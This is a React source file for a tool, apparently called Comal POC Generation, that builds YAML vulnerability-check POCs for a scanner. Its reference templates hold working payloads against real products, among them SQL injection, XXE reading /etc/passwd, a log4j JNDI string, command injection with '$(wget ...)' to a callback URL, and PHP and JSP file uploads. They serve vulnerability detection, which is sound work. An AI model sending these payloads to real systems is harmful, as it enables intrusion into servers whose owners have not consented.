import React from 'react';
import update from 'immutability-helper';
import yaml from 'js-yaml';
import clone from 'clone';
import ClipboardJS from 'clipboard';
import { Layout, Menu, Breadcrumb, Row, Col, Form, Input, Button, Affix, notification } from 'antd';
import RuleComponent from './Rule';
import Rule from './model/rule'
import { findObjectByIndex } from "./model/helper";
import { Select } from 'antd'; // 从 Ant Design 库中导入 Select 组件

const { Header, Content, Footer } = Layout;

export default class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      id: "VUL-xxxx-xxxx",
      name: "poc-yaml-sql",
      tags: "",
      transport : "http",
      rules: [new Rule()],
      detail: {},
      poc: "",
      detail:{
        vulnerability: {
          proof: {
            info: "存在xxxxxxx漏洞。"
          }
        }
      },
    };

    this.updateRule = this.updateRule.bind(this);
    this.generatePOC = this.generatePOC.bind(this);
    this.addRule = this.addRule.bind(this);
    this.deleteRule = this.deleteRule.bind(this);
    this.notify = this.notify.bind(this);
  }


  componentDidMount() {
    const cjs = new ClipboardJS('#copy-btn');
    cjs.on('success', e => {
      this.notify("复制成功", "POC内容已成功复制到剪切板");
    })
  }

  notify(title, description) {
    notification.success({
      message: title,
      description: description,
      duration: 3,
    })
  }

  updateRule(index, key, value) {
    const i = findObjectByIndex(this.state.rules, index);
    if (i >= 0) {
      let rules = update(this.state.rules, {[i]: {[key]: {$set: value}}});
      this.setState({rules});
    }
  }

  deleteRule(index) {
    const i = findObjectByIndex(this.state.rules, index);
    if (i >= 0) {
      let rules = update(this.state.rules, {$splice: [[i, 1]]});
      this.setState({rules});
    }
  }

  generatePOC() {
    let data = {
      id: this.state.id,
      name: this.state.name,
      tags: this.state.tags,
      transport: this.state.transport,
      rules: clone(this.state.rules),
      detail: this.state.detail,
    };

    for (let rule of data.rules) {
      delete rule['index'];

      let headers = {};
      for (let header of rule.headers) {
        if (header['key']) {
          headers[header['key']] = header['value'];
        }
      }

      if (Object.keys(headers).length > 0) {
        rule.headers = headers;
      } else {
        delete rule.headers;
      }
      if (!rule.body || !rule.body.length) {
        rule.body = ""; // 设置为空字符串或其他默认值
      }

      // if (!rule.body.length) {
      //   delete rule.body;
      // }

      if (!rule.path.length) {
        delete rule.path;
      }

      if (!rule.search.length) {
        delete rule.search;
      }

      rule.expression = `${rule.expression}\n`;

      let request = {};
      let expressionq = {};
      request.method = rule.method;
      request.follow_redirects = rule.follow_redirects;
      request.body = rule.body;
      request.path = rule.path;

      expressionq = rule.expression;

      delete rule.method;
      delete rule.follow_redirects;
      delete rule.body;
      delete rule.path;
      delete rule.expression;

      rule.request = request;
      rule.expression = expressionq;
    }

    let rulesObj = {};
    data.rules.forEach((rule, index) => {
      rulesObj[`r${index}`] = rule;
    });
    const ruleCount = Object.keys(rulesObj).length;
    function buildExpression(ruleCount) {
      let result = '';

      for (let i = 0; i < ruleCount; i++) {
        if (i > 0) {
          result += '&&';
        }
        result += `r${i}()`;
      }

      return result;
    }

    const poc = yaml.safeDump({
      id: this.state.id,
      name: this.state.name,
      tags: ["xxxx"],
      transport: this.state.transport,
      rules: rulesObj,
      expression: buildExpression(ruleCount),
      detail: this.state.detail,
    });

    this.setState({ poc, isEditable: true });
  }


  addRule() {
    let rules = update(this.state.rules, {$push: [new Rule()]});
    this.setState({rules})
  }

  

  render() {
    const formItemLayout = {
      labelCol: { span: 2 },
      wrapperCol: { span: 22 },
    };

    return (
      <Layout className="layout">
        <Header>
          <div className="logo" ><span role="img" aria-label="dna" aria-hidden="true">🧬</span> Comal POC Generation</div>
          <Menu
            theme="dark"
            mode="horizontal"
            defaultSelectedKeys={['2']}
            style={{ lineHeight: '64px' }}
          >
          </Menu>
        </Header>
        <Content style={{ padding: '0 50px' }}>
          <Breadcrumb style={{ margin: '16px 0' }}>
            <Breadcrumb.Item>首页</Breadcrumb.Item>
            <Breadcrumb.Item>POC生成</Breadcrumb.Item>
          </Breadcrumb>
          <div style={{ background: '#fff', padding: 24, minHeight: 280 }}>
          <Row gutter={16} type="flex">
            <Col span={12} >
              <Form layout={"horizontal"} labelAlign="left">
                <Form.Item label="POC名" {...formItemLayout}>
                  <Input 
                    placeholder="由数字、字母、短横线组成" 
                    type="text" 
                    value={this.state.name}
                    onChange={e => this.setState({name: e.target.value})}
                  />
                </Form.Item>
                {this.state.rules.map((rule, index) =>
                  <RuleComponent
                    key={rule.index}
                    rule={rule}
                    ruleSize={this.state.rules.length}
                    updateHandler={this.updateRule}
                    addHandler={this.addRule}
                    deleteHandler={this.deleteRule}
                  />
                )}
              </Form>
            </Col>
              <Col span={12} style={{ paddingTop: "4px" }}>
                <Affix offsetTop={8}>
                  <div style={{ display: "flex", flexDirection: "column" }}>
                    <div style={{ marginBottom: "15px" }}>
                      <Select
                        label="请选择参考提示"
                        placeholder="选择生成的POC模板"
                        value={this.state.selectedPOC}
                        style={{ width: "100%" }}
                        onChange={value => this.setState({ selectedPOC: value })}
                      >
                        <Select.Option value="poc0">poc-yaml-base</Select.Option>
                        <Select.Option value="poc1">poc-yaml-noEchoRce</Select.Option>
                        <Select.Option value="poc2">poc-yaml-sqli</Select.Option>
                        <Select.Option value="poc3">poc-yaml-sqli-noEcho</Select.Option>
                        <Select.Option value="poc4">poc-yaml-xss</Select.Option>
                        <Select.Option value="poc5">poc-yaml-upload</Select.Option>
                        <Select.Option value="poc6">poc-yaml-rce</Select.Option>
                        <Select.Option value="poc7">poc-yaml-fileRead</Select.Option>
                        <Select.Option value="poc8">poc-yaml-ldapReverse</Select.Option>
                        <Select.Option value="poc9">poc-yaml-httpReverse</Select.Option>
                        
                      </Select>
                    </div>
                    <div>
                      <Input.TextArea
                        rows={15}
                        placeholder="根据选择生成的POC内容"
                        value={this.state.selectedPOC === 'poc0' ? "id: \nname: tomcat-cve-2017-12615\ntransport: http\ntags:\n    - tomcat\nset:\n    filename: randomLowercase(6)\n    verifyStr: randomLowercase(12)\n    commentStr: randomLowercase(12)\nrules:\n    r0:\n        request:\n            cache: true\n            method: PUT\n            path: /{{filename}}.jsp/\n            body: '{{verifyStr}} <%-- {{commentStr}} --%>'\n            follow_redirects: false\n        expression: response.status == 201\n    r1:\n        request:\n            cache: true\n            method: GET\n            path: /{{filename}}.jsp\n            follow_redirects: false\n        expression: response.status == 200 && response.body.bcontains(bytes(verifyStr)) && !response.body.bcontains(bytes(commentStr))\nexpression: r0() && r1()\ndetail:\n    vulnerability:\n        name: tomcat-cve-2017-12615"
                        :this.state.selectedPOC === 'poc1' ? "id: \nname: solr-cve-2017-12629\nmanual: true\ntransport: http\ntags: \n    - solr\nset:\n    reverse: newReverse()\n    reverseURL: reverse.url\nrules:\n    r0:\n        request:\n            cache: true\n            method: GET\n            path: /solr/admin/cores?wt=json\n        expression: \"true\"\n        output:\n            search: r'\"name\":\"(?P<core>[^\"]+)\",'.bsubmatch(response.body)\n            core: search[\"core\"]\n    r1:\n        request:\n            cache: true\n            method: GET\n            path: /solr/{{ core }}/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22{{ reverseURL }}%2F%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser\n            follow_redirects: true\n        expression: reverse.wait(5)\nexpression: r0() && r1()\ndetail:\n    vulnerability:\n        name: tomcat-cve-2017-12615"
                        :this.state.selectedPOC === 'poc2' ? 'id: VUL-2023-13362\nname: udfmr-sqli\ntags:\n  - HFOffice\ntransport: http\nrules:\n  req1:\n    request:\n      cache: false\n      method: POST\n      path: /iOffice/prg/set/wss/udfmr.asmx\n      headers: \n        Content-Type: text/xml; charset=utf-8\n        SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"\n      body: |\n        <?xml version="1.0" encoding="utf-8"?>\n        <soap: Envelope xmlns: xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns: xsd="http://www.w3.org/2001/XMLSchema" xmlns: soap="http://schemas.xmlsoap.org/soap/envelope/">\n          <soap: Body>\n            <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">\n              <condition>1=user_name()</condition>\n            </GetEmpSearch>\n          </soap: Body>\n        </soap: Envelope>\n    expression: response.body.bcontains(b"System.Data.SqlClient.SqlException") && response.body.bcontains(b"转换成数据类型 int 时失败")\nexpression: req1()\ndetail:\n  vulnerability:\n    proof:\n      info: 存在红帆OA udfmr.asmx SQL注入'
                        :this.state.selectedPOC === 'poc3' ? 'id: VUL-2023-10012\nname: jinher-oa_gettreedate_sqli\ntags:\n    - JINHER-OA\ntransport: http\nset: null\nrules:\n    r1:\n        request:\n            method: GET\n            path: /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a3%27+--%20and%201=1\n            headers:\n                Connection: close\n                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\n                Content-Type: application/x-www-form-urlencoded\n        expression:  response.status == 200 && (response.latency > 3000) && response.body.bcontains(b\'id\') && response.body.bcontains(b\'text\') && response.body.bcontains(b\'permissions\') && response.body.bcontains(b\'GetTreeDate.aspx?nodeid\') \n    r2:\n        request:\n            method: GET\n            path:  /C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+%270%3a0%3a5%27+--%20and%201=1\n            headers:\n                Connection: close\n                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\n                Content-Type: application/x-www-form-urlencoded\n        expression:  response.status == 200 && (response.latency  > 5000) && response.body.bcontains(b\'id\') && response.body.bcontains(b\'text\') && response.body.bcontains(b\'permissions\') && response.body.bcontains(b\'GetTreeDate.aspx?nodeid\')     \nexpression: r1() && r2()\ndetail:\n    vulnerability:\n        proof:\n            info: 存在 jinher-oa_gettreedate_sqli 漏洞'
                        :this.state.selectedPOC === 'poc4' ? 'id: VUL-2020-11007\nname: samsung-wlan-ap_xss\ntags:\n    - Samsung-AP\n    - Samsung-Router\ntransport: http\nset: null\nrules:\n    req:\n        request:\n            cache: false\n            method: GET\n            path: /%3Cscript%3Ealert(document.domain)%3C/script%3E\n        expression: response.status==404 && \n                    response.body.bcontains(b\' / tmp / www / <script>alert(document.domain)</script>\') && \n                    response.headers["Content-Type"].contains("text/html")\nexpression: req()\ndetail:\n    vulnerability:\n        proof:\n            info: 存在Samsung-Wlan-Ap-XSS 跨站脚本攻击漏洞'
                        :this.state.selectedPOC === 'poc5' ? 'id: VUL-2023-13510\nname: CVE-2023-5360\ntags:\n  - wordpress\ntransport: http\nset:\n  filename: randomLowercase(8)\nrules:\n  req0:\n    request:\n      cache: false\n      method: GET\n      path: /\n    expression: response.status==200\n    output: \n      res: r\'var WprConfig.*"nonce":"(?P<nonce>\w{10})"\'.bsubmatch(response.body)\n      nonce: res["nonce"]\n  req1:\n    request:\n      cache: false\n      method: POST\n      path: /wp-admin/admin-ajax.php?action=wpr_addons_upload_file\n      headers: \n        Content-Type: multipart/form-data; boundary=---------------------------318949277012917151102295043236\n      body: |\n        -----------------------------318949277012917151102295043236\n        Content-Disposition: form-data; name="uploaded_file"; filename="{{ filename }}.ph$p"\n        Content-Type: image/png\n\n        <?php echo md5("CVE-2023-5360");?>\n        -----------------------------318949277012917151102295043236\n        Content-Disposition: form-data; name="allowed_file_types"\n\n        ph$p\n        -----------------------------318949277012917151102295043236\n        Content-Disposition: form-data; name="triggering_event"\n\n        click\n        -----------------------------318949277012917151102295043236\n        Content-Disposition: form-data; name="wpr_addons_nonce"\n\n        {{ nonce }}\n        -----------------------------318949277012917151102295043236--\n    expression: response.status==200 \n  req2:\n    request:\n      cache: false\n      method: GET\n      path: /wp-content/uploads/wpr-addons/forms/{{ filename }}.php\n    expression: response.body.bcontains(bytes("86398d3a90432d24901a7bbdcf1ab2ba"))\nexpression: req0() && req1() && req2()\ndetail:\n  vulnerability:\n    proof:\n      info: 存在CVE-2023-5360文件上传漏洞'
                        : this.state.selectedPOC === 'poc6' ? 'id: VUL-2022-06015\nname: Sangfor_AD-RCE\ntags:\n    - Sangfor-Application-Delivery\ntransport: http\nset: null\nrules:\n    r0:\n        request:\n            body: userID=username;id;log_type=report&userPsw=password&rnd=0.8423849339596927\n            headers:\n                Content-Type: application/x-www-form-urlencoded\n            method: POST\n            path: /report/script/login.php\n        expression: response.status == 200 && response.body.bcontains(b"uid=") && response.body.bcontains(b"gid=") && response.body.bcontains(b"groups=")\n        output: null\nexpression: r0()\ndetail:\n    vulnerability:\n        proof:\n            info: 存在Sangfor-AD-RCE 远程代码执行漏洞'
                        : this.state.selectedPOC === 'poc7' ? 'id: VUL-2018-15092\nname: CVE-2018-8033\ntags:\n    - ofbiz\ntransport: http\nrules:\n    r0:\n        request:\n            body: <?xml version="1.0"?><!DOCTYPE x [<!ENTITY disclose SYSTEM "file://///etc/passwd">]><methodCall><methodName>&disclose;</methodName></methodCall>\n            follow_redirects: false\n            headers:\n                Content-Type: application/xml\n            method: POST\n            path: /webtools/control/xmlrpc\n        expression: response.status == 200 && response.content_type.contains("text/xml") && "root:[x*]:0:0:".bmatches(response.body)\n        output: null\nexpression: r0()\ndetail:\n    vulnerability:\n        proof: \n              info: "存在CVE-2018-8033Apache OFBiz 安全漏洞"'
                        : this.state.selectedPOC === 'poc8' ? 'id: VUL-2023-02017\nname: Apache_Solr_log4j_rce\ntransport: http\ntags:\n    - Apache-Solr\nset:\n    reverse: newReverse()\n    reverseURL: reverse.ldap\nrules:\n    r0:\n        request:\n            method: GET\n            path: /solr/admin/collections?action=${jndi:{{reverseURL}}}&wt=json\n            follow_redirects: true\n        expression: reverse.wait(5)\nexpression: r0()\ndetail:\n    vulnerability:\n        info: 存在Apache-Solr log4j漏洞'
                        : this.state.selectedPOC === 'poc9' ? 'id: VUL-2021-07983\nname: CVE-2021-33544\ntags:\n    - geutebruck\ntransport: http\nset: \n  reverse: newReverse()\n  reverseURL: reverse.url\nrules:\n    r0:\n        request:\n            headers:\n                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n            method: GET\n            path: //uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20{{reverseURL}})&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything\n        expression: reverse.wait(5)\n        output: null\nexpression: r0()\ndetail:\n    vulnerability:\n        proof: \n           info: 存在CVE-2021-33544漏洞'
                        :''
                      }
                        readOnly={true}
                      />
                    </div>
                    <span style={{ fontSize: "18px", fontWeight: "bold" }}>生成的poc</span>
                    <div>
                      <Input.TextArea
                        style={{ fontFamily: 'inherit', fontSize: '16px', borderRadius: '8px' }}
                        rows={13}
                        placeholder="生成POC内容"
                        value={this.state.poc}
                        id="poc-detail"
                        readOnly={!this.state.isEditable}
                        //将生成的内容可以进行编辑
                        onChange={(e) => this.setState({ poc: e.target.value })}
                      />
                    </div>
                    <Row justify="end" type="flex">
                      <Button type="primary" size="default" onClick={this.generatePOC} className="br">生成</Button>
                      <Button
                        type="dashed"
                        icon="copy"
                        id="copy-btn"
                        data-clipboard-text={this.state.poc}
                      >
                        复制POC
                      </Button>
                    </Row>
                    
                  </div>
                </Affix>
              </Col>
          </Row>
          </div>
        </Content>
        
        <Footer style={{ textAlign: 'center' }}>©2023 Comal POC Generation| <a href="https://i8bbmkcybg.feishu.cn/docx/ZSTddSENioK8Z4xhbvNchAq0nDb">点此处跳转到文档参考</a></Footer>
      </Layout>
    );
  }
}